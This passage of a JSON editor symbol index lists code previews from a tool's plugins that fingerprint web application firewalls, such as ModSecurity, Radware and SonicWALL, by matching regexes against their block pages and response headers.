        "importPath": "tools.whatwaf.content.plugins.instart",
        "description": "tools.whatwaf.content.plugins.instart",
        "peekOfCode": "__product__ = \"Instart Logic (Palo Alto)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"instartrequestid\", re.I),\n    )\n    if headers.get(\"X-Instart-Request-ID\", \"\") != \"\":\n        return True\n    if headers.get(\"X-Instart-CacheKeyMod\", \"\") != \"\":",
        "detail": "tools.whatwaf.content.plugins.instart",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.janusec",
        "description": "tools.whatwaf.content.plugins.janusec",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"janusec\", re.I),\n        re.compile(r\"(http(s)?\\W+(www.)?)?janusec.(com|net|org)\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.janusec",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.janusec",
        "description": "tools.whatwaf.content.plugins.janusec",
        "peekOfCode": "__product__ = \"Janusec Application Gateway (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"janusec\", re.I),\n        re.compile(r\"(http(s)?\\W+(www.)?)?janusec.(com|net|org)\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.janusec",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.jiasule",
        "description": "tools.whatwaf.content.plugins.jiasule",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"^jsl(_)?tracking\", re.I),\n        re.compile(r\"(__)?jsluid(=)?\", re.I),\n        re.compile(r\"notice.jiasule\", re.I),\n        re.compile(r\"(static|www|dynamic).jiasule.(com|net)\", re.I)\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.jiasule",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.jiasule",
        "description": "tools.whatwaf.content.plugins.jiasule",
        "peekOfCode": "__product__ = \"Jiasule (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"^jsl(_)?tracking\", re.I),\n        re.compile(r\"(__)?jsluid(=)?\", re.I),\n        re.compile(r\"notice.jiasule\", re.I),\n        re.compile(r\"(static|www|dynamic).jiasule.(com|net)\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.jiasule",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.litespeed",
        "description": "tools.whatwaf.content.plugins.litespeed",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"litespeed.web.server\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.litespeed",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.litespeed",
        "description": "tools.whatwaf.content.plugins.litespeed",
        "peekOfCode": "__product__ = \"Litespeed webserver Generic Protection\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"litespeed.web.server\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.litespeed",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.malcare",
        "description": "tools.whatwaf.content.plugins.malcare",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"malcare\", re.I),\n        re.compile(r\".>login.protection<.+.><.+>powered.by<.+.>(<.+.>)?(.?malcare.-.pro|blogvault)?\", re.I),\n        re.compile(r\".>firewall<.+.><.+>powered.by<.+.>(<.+.>)?(.?malcare.-.pro|blogvault)?\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.malcare",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.malcare",
        "description": "tools.whatwaf.content.plugins.malcare",
        "peekOfCode": "__product__ = \"Malcare (MalCare Security WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"malcare\", re.I),\n        re.compile(r\".>login.protection<.+.><.+>powered.by<.+.>(<.+.>)?(.?malcare.-.pro|blogvault)?\", re.I),\n        re.compile(r\".>firewall<.+.><.+>powered.by<.+.>(<.+.>)?(.?malcare.-.pro|blogvault)?\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.malcare",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.modsecurity",
        "description": "tools.whatwaf.content.plugins.modsecurity",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"ModSecurity|NYOB\", re.I),\n        re.compile(r\"mod_security\", re.I),\n        re.compile(r\"this.error.was.generated.by.mod.security\", re.I),\n        re.compile(r\"web.server at\", re.I),\n        re.compile(r\"page.you.are.(accessing|trying)?.(to|is)?.(access)?.(is|to)?.(restricted)?\", re.I),\n        re.compile(r\"blocked.by.mod.security\", re.I)\n    )",
        "detail": "tools.whatwaf.content.plugins.modsecurity",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.modsecurity",
        "description": "tools.whatwaf.content.plugins.modsecurity",
        "peekOfCode": "__product__ = \"Open Source Web Application Firewall (Modsecurity)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"ModSecurity|NYOB\", re.I),\n        re.compile(r\"mod_security\", re.I),\n        re.compile(r\"this.error.was.generated.by.mod.security\", re.I),\n        re.compile(r\"web.server at\", re.I),\n        re.compile(r\"page.you.are.(accessing|trying)?.(to|is)?.(access)?.(is|to)?.(restricted)?\", re.I),\n        re.compile(r\"blocked.by.mod.security\", re.I)",
        "detail": "tools.whatwaf.content.plugins.modsecurity",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.modsecurityowasp",
        "description": "tools.whatwaf.content.plugins.modsecurityowasp",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"not.acceptable\", re.I),\n        re.compile(r\"additionally\\S.a.406.not.acceptable\", re.I)\n    )\n    for detection in detection_schema:\n        if status == 406:\n            if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.modsecurityowasp",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.modsecurityowasp",
        "description": "tools.whatwaf.content.plugins.modsecurityowasp",
        "peekOfCode": "__product__ = \"Mod Security (OWASP CSR)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"not.acceptable\", re.I),\n        re.compile(r\"additionally\\S.a.406.not.acceptable\", re.I)\n    )\n    for detection in detection_schema:\n        if status == 406:",
        "detail": "tools.whatwaf.content.plugins.modsecurityowasp",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.nexusguard",
        "description": "tools.whatwaf.content.plugins.nexusguard",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"nexus.?guard\", re.I),\n        re.compile(r\"((http(s)?://)?speresources.)?nexusguard.com.wafpage\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.nexusguard",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.nexusguard",
        "description": "tools.whatwaf.content.plugins.nexusguard",
        "peekOfCode": "__product__ = \"NexusGuard Security (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"nexus.?guard\", re.I),\n        re.compile(r\"((http(s)?://)?speresources.)?nexusguard.com.wafpage\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.nexusguard",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.nginxgeneric",
        "description": "tools.whatwaf.content.plugins.nginxgeneric",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"nginx\", re.I),\n        re.compile(r\"you.do(not|n.t)?.have.permission.to.access.this.document\")\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.nginxgeneric",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.nginxgeneric",
        "description": "tools.whatwaf.content.plugins.nginxgeneric",
        "peekOfCode": "__product__ = \"Nginx Generic Protection\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"nginx\", re.I),\n        re.compile(r\"you.do(not|n.t)?.have.permission.to.access.this.document\")\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.nginxgeneric",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.paloalto",
        "description": "tools.whatwaf.content.plugins.paloalto",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schemas = (\n        re.compile(r\"has.been.blocked.in.accordance.with.company.policy\"),\n        re.compile(r\".>Virus.Spyware.Download.Blocked<.\")\n    )\n    for detection in detection_schemas:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.paloalto",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.paloalto",
        "description": "tools.whatwaf.content.plugins.paloalto",
        "peekOfCode": "__product__ = \"Palo Alto Firewall (Palo Alto Networks)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schemas = (\n        re.compile(r\"has.been.blocked.in.accordance.with.company.policy\"),\n        re.compile(r\".>Virus.Spyware.Download.Blocked<.\")\n    )\n    for detection in detection_schemas:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.paloalto",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.perimx",
        "description": "tools.whatwaf.content.plugins.perimx",
        "peekOfCode": "def detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"access.to.this.page.has.been.denied.because.we.believe.you.are.using.automation.tool\", re.I),\n        re.compile(r\"http(s)?://(www.)?perimeterx.\\w+.whywasiblocked\", re.I),\n        re.compile(r\"perimeterx\", re.I),\n        re.compile(r\"(..)?client.perimeterx.*/[a-zA-Z]{8,15}/*.*.js\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.perimx",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.perimx",
        "description": "tools.whatwaf.content.plugins.perimx",
        "peekOfCode": "__product__ = \"Anti Bot Protection (PerimeterX)\"\ndef detect(content, **kwargs):\n    detection_schema = (\n        re.compile(r\"access.to.this.page.has.been.denied.because.we.believe.you.are.using.automation.tool\", re.I),\n        re.compile(r\"http(s)?://(www.)?perimeterx.\\w+.whywasiblocked\", re.I),\n        re.compile(r\"perimeterx\", re.I),\n        re.compile(r\"(..)?client.perimeterx.*/[a-zA-Z]{8,15}/*.*.js\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.perimx",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.pk",
        "description": "tools.whatwaf.content.plugins.pk",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>pkSecurityModule\\W..\\WSecurity.Alert<.\", re.I),\n        re.compile(r\".http(s)?.//([w]{3})?.kitnetwork.\\w\", re.I),\n        re.compile(r\".>A.safety.critical.request.was.discovered.and.blocked.<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.pk",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.pk",
        "description": "tools.whatwaf.content.plugins.pk",
        "peekOfCode": "__product__ = \"pkSecurityModule (IDS)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".>pkSecurityModule\\W..\\WSecurity.Alert<.\", re.I),\n        re.compile(r\".http(s)?.//([w]{3})?.kitnetwork.\\w\", re.I),\n        re.compile(r\".>A.safety.critical.request.was.discovered.and.blocked.<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.pk",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.powerful",
        "description": "tools.whatwaf.content.plugins.powerful",
        "peekOfCode": "def detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"Powerful Firewall\", re.I),\n        re.compile(r\"http(s)?...tiny.cc.powerful.firewall\", re.I)\n    )\n    if status is not None:\n        if status == 403:\n            for detection in detection_schema:\n                if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.powerful",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.powerful",
        "description": "tools.whatwaf.content.plugins.powerful",
        "peekOfCode": "__product__ = \"Powerful Firewall (MyBB plugin)\"\ndef detect(content, **kwargs):\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"Powerful Firewall\", re.I),\n        re.compile(r\"http(s)?...tiny.cc.powerful.firewall\", re.I)\n    )\n    if status is not None:\n        if status == 403:\n            for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.powerful",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.radware",
        "description": "tools.whatwaf.content.plugins.radware",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".\\bcloudwebsec.radware.com\\b.\", re.I),\n        re.compile(r\".>unauthorized.activity.has.been.detected<.\", re.I),\n        re.compile(r\"with.the.following.case.number.in.its.subject:.\\d+.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.radware",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.radware",
        "description": "tools.whatwaf.content.plugins.radware",
        "peekOfCode": "__product__ = \"Radware (AppWall WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\".\\bcloudwebsec.radware.com\\b.\", re.I),\n        re.compile(r\".>unauthorized.activity.has.been.detected<.\", re.I),\n        re.compile(r\"with.the.following.case.number.in.its.subject:.\\d+.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.radware",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.rsfirewall",
        "description": "tools.whatwaf.content.plugins.rsfirewall",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"com.rsfirewall.403.forbidden\", re.I),\n        re.compile(r\"com.rsfirewall.event\", re.I),\n        re.compile(r\"(\\b)?rsfirewall(\\b)?\", re.I),\n        re.compile(r\"rsfirewall\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.rsfirewall",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.rsfirewall",
        "description": "tools.whatwaf.content.plugins.rsfirewall",
        "peekOfCode": "__product__ = \"RSFirewall (Joomla WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"com.rsfirewall.403.forbidden\", re.I),\n        re.compile(r\"com.rsfirewall.event\", re.I),\n        re.compile(r\"(\\b)?rsfirewall(\\b)?\", re.I),\n        re.compile(r\"rsfirewall\", re.I)\n    )\n    for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.rsfirewall",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.sabre",
        "description": "tools.whatwaf.content.plugins.sabre",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"dxsupport@sabre.com\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.sabre",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.sabre",
        "description": "tools.whatwaf.content.plugins.sabre",
        "peekOfCode": "__product__ = \"Sabre Firewall (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"dxsupport@sabre.com\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.sabre",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.safedog",
        "description": "tools.whatwaf.content.plugins.safedog",
        "peekOfCode": "def detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(http(s)?)?(://)?(www|404|bbs|\\w+)?.safedog.\\w\", re.I),\n        re.compile(r\"waf(.?\\d+.?\\d+)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True\n        if detection.search(headers.get(HTTP_HEADER.X_POWERED_BY, \"\")) is not None:",
        "detail": "tools.whatwaf.content.plugins.safedog",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.safedog",
        "description": "tools.whatwaf.content.plugins.safedog",
        "peekOfCode": "__product__ = \"SafeDog WAF (SafeDog)\"\ndef detect(content, **kwargs):\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"(http(s)?)?(://)?(www|404|bbs|\\w+)?.safedog.\\w\", re.I),\n        re.compile(r\"waf(.?\\d+.?\\d+)\", re.I),\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.safedog",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.secupress",
        "description": "tools.whatwaf.content.plugins.secupress",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<h\\d*>secupress<.\", re.I),\n        re.compile(r\"block.id.{1,2}bad.url.contents.<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.secupress",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.secupress",
        "description": "tools.whatwaf.content.plugins.secupress",
        "peekOfCode": "__product__ = \"SecuPress (Wordpress WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"<h\\d*>secupress<.\", re.I),\n        re.compile(r\"block.id.{1,2}bad.url.contents.<.\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.secupress",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.securesphere",
        "description": "tools.whatwaf.content.plugins.securesphere",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detected = 0\n    detection_schema = (\n        re.compile(r\"<h2>error<.h2>\"),\n        re.compile(r\"<title>error<.title>\", re.I),\n        re.compile(r\"<b>error<.b>\", re.I),\n        re.compile(r'<td.class=\"(errormessage|error)\".height=\"[0-9]{1,3}\".width=\"[0-9]{1,3}\">', re.I),\n        re.compile(r\"the.incident.id.(is|number.is).\", re.I),\n        re.compile(r\"page.cannot.be.displayed\", re.I),",
        "detail": "tools.whatwaf.content.plugins.securesphere",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.securesphere",
        "description": "tools.whatwaf.content.plugins.securesphere",
        "peekOfCode": "__product__ = \"Imperva SecureSphere (Imperva)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detected = 0\n    detection_schema = (\n        re.compile(r\"<h2>error<.h2>\"),\n        re.compile(r\"<title>error<.title>\", re.I),\n        re.compile(r\"<b>error<.b>\", re.I),\n        re.compile(r'<td.class=\"(errormessage|error)\".height=\"[0-9]{1,3}\".width=\"[0-9]{1,3}\">', re.I),\n        re.compile(r\"the.incident.id.(is|number.is).\", re.I),",
        "detail": "tools.whatwaf.content.plugins.securesphere",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.shadowd",
        "description": "tools.whatwaf.content.plugins.shadowd",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"<h\\d>\\d{3}.forbidden<.h\\d>\", re.I),\n        re.compile(r\"request.forbidden.by.administrative.rules.\", re.I)\n    )\n    if status is not None and status == 403:\n        for detection in detection_schema:\n            if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.shadowd",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.shadowd",
        "description": "tools.whatwaf.content.plugins.shadowd",
        "peekOfCode": "__product__ = \"Shadow Daemon Opensource (WAF)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    status = kwargs.get(\"status\", 0)\n    detection_schema = (\n        re.compile(r\"<h\\d>\\d{3}.forbidden<.h\\d>\", re.I),\n        re.compile(r\"request.forbidden.by.administrative.rules.\", re.I)\n    )\n    if status is not None and status == 403:\n        for detection in detection_schema:",
        "detail": "tools.whatwaf.content.plugins.shadowd",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.shieldsecurity",
        "description": "tools.whatwaf.content.plugins.shieldsecurity",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"blocked.by.the.shield\", re.I),\n        re.compile(r\"transgression(\\(s\\))?.against.this\", re.I),\n        re.compile(r\"url.{1,2}form.or.cookie.data.wasn.t.appropriate\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.shieldsecurity",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.shieldsecurity",
        "description": "tools.whatwaf.content.plugins.shieldsecurity",
        "peekOfCode": "__product__ = \"Shield Security\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"blocked.by.the.shield\", re.I),\n        re.compile(r\"transgression(\\(s\\))?.against.this\", re.I),\n        re.compile(r\"url.{1,2}form.or.cookie.data.wasn.t.appropriate\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:",
        "detail": "tools.whatwaf.content.plugins.shieldsecurity",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.siteguard",
        "description": "tools.whatwaf.content.plugins.siteguard",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\">Powered.by.SiteGuard.Lite<\", re.I),\n        re.compile(r\"refuse.to.browse\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.siteguard",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.siteguard",
        "description": "tools.whatwaf.content.plugins.siteguard",
        "peekOfCode": "__product__ = \"Website Security SiteGuard (Lite)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\">Powered.by.SiteGuard.Lite<\", re.I),\n        re.compile(r\"refuse.to.browse\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.siteguard",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.sonicwall",
        "description": "tools.whatwaf.content.plugins.sonicwall",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"This.request.is.blocked.by.the.SonicWALL\", re.I),\n        re.compile(r\"Dell.SonicWALL\", re.I),\n        re.compile(r\"\\bDell\\b\", re.I),\n        re.compile(r\"Web.Site.Blocked.+\\bnsa.banner\", re.I),\n        re.compile(r\"SonicWALL\", re.I),\n        re.compile(r\".>policy.this.site.is.blocked<.\", re.I)",
        "detail": "tools.whatwaf.content.plugins.sonicwall",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.sonicwall",
        "description": "tools.whatwaf.content.plugins.sonicwall",
        "peekOfCode": "__product__ = \"SonicWALL Firewall (Dell)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"This.request.is.blocked.by.the.SonicWALL\", re.I),\n        re.compile(r\"Dell.SonicWALL\", re.I),\n        re.compile(r\"\\bDell\\b\", re.I),\n        re.compile(r\"Web.Site.Blocked.+\\bnsa.banner\", re.I),\n        re.compile(r\"SonicWALL\", re.I),",
        "detail": "tools.whatwaf.content.plugins.sonicwall",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.squid",
        "description": "tools.whatwaf.content.plugins.squid",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"squid\", re.I),\n        re.compile(r\"Access control configuration prevents\", re.I),\n        re.compile(r\"X.Squid.Error\", re.I),\n    )\n    if headers.get(\"eventsquid-id\", None) is not None:\n        return True",
        "detail": "tools.whatwaf.content.plugins.squid",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.squid",
        "description": "tools.whatwaf.content.plugins.squid",
        "peekOfCode": "__product__ = \"Squid Proxy (IDS)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    headers = kwargs.get(\"headers\", {})\n    detection_schema = (\n        re.compile(r\"squid\", re.I),\n        re.compile(r\"Access control configuration prevents\", re.I),\n        re.compile(r\"X.Squid.Error\", re.I),\n    )\n    if headers.get(\"eventsquid-id\", None) is not None:",
        "detail": "tools.whatwaf.content.plugins.squid",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.stackpath",
        "description": "tools.whatwaf.content.plugins.stackpath",
        "peekOfCode": "def detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"action.that.triggered.the.service.and.blocked\", re.I),\n        re.compile(r\"<h2>sorry,.you.have.been.blocked.?<.h2>\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.stackpath",
        "documentation": {}
    },
    {
        "label": "__product__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.plugins.stackpath",
        "description": "tools.whatwaf.content.plugins.stackpath",
        "peekOfCode": "__product__ = \"Stackpath WAF (StackPath)\"\ndef detect(content, **kwargs):\n    content = str(content)\n    detection_schema = (\n        re.compile(r\"action.that.triggered.the.service.and.blocked\", re.I),\n        re.compile(r\"<h2>sorry,.you.have.been.blocked.?<.h2>\", re.I)\n    )\n    for detection in detection_schema:\n        if detection.search(content) is not None:\n            return True",
        "detail": "tools.whatwaf.content.plugins.stackpath",
        "documentation": {}
    },
    {
        "label": "detect",
        "kind": 2,
        "importPath": "tools.whatwaf.content.plugins.stingray",
        "description": "tools.whatwaf.content.plugins.stingray",
